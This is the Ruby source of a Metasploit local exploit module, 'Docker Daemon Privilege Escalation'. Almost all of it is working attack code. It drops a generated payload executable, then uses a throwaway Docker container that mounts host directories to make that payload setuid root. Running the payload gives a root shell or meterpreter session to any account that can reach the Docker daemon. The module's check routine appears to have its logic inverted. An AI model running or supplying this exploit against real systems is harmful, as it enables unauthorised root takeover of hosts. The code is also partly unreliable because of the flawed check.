##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local

  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info, {
      'Name'           => 'Docker Daemon Privilege Escalation',
      'Description'    => %q{
        This module obtains root privileges from any host account with access to the
        Docker daemon. Usually this includes accounts in the `docker` group.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['forzoni'],
      'DisclosureDate' => 'Jun 28 2016',
      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86, ARCH_X86_64, ARCH_ARMLE, ARCH_MIPSLE, ARCH_MIPSBE],
      'Targets'        => [ ['Automatic', {}] ],
      'DefaultOptions' => { 'PrependFork' => true, 'WfsDelay' => 60 },
      'SessionTypes'   => ['shell', 'meterpreter'],
      'DefaultTarget'  => 0
      }
    ))
    register_advanced_options([
      OptString.new("WritableDir", [true, "A directory where we can write files", "/tmp"])
    ], self.class)
  end

  def check
    if cmd_exec('docker ps && echo true') == 'true'
      print_error("Failed to access Docker daemon.")
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Vulnerable
    end
  end

  def exploit
    pl = generate_payload_exe
    exe_path = "#{datastore['WritableDir']}/#{rand_text_alpha(6 + rand(5))}"
    print_status("Writing payload executable to '#{exe_path}'")

    write_file(exe_path, pl)
    register_file_for_cleanup(exe_path)

    print_status("Executing script to create and run docker container")
    vprint_status cmd_exec("chmod +x #{exe_path}")
    vprint_status shell_script(exe_path)
    vprint_status cmd_exec("sh -c '#{shell_script(exe_path)}'")

    print_status "Waiting #{datastore['WfsDelay']}s for payload"
  end

  def shell_script(exploit_path)
    deps = %w(/bin /lib /lib64 /etc /usr /opt) + [datastore['WritableDir']]
    dep_options = deps.uniq.map { |dep| "-v #{dep}:#{dep}" }.join(" ")

    %Q{
      IMG=`(echo "FROM scratch"; echo "CMD a") | docker build -q - | awk "END { print \\\\$NF }"`
      EXPLOIT="chown 0:0 #{exploit_path}; chmod u+s #{exploit_path}"
      docker run #{dep_options} $IMG /bin/sh -c "$EXPLOIT"
      docker rmi -f $IMG
      #{exploit_path}
    }.strip.split("\n").map(&:strip).join(';')
  end

end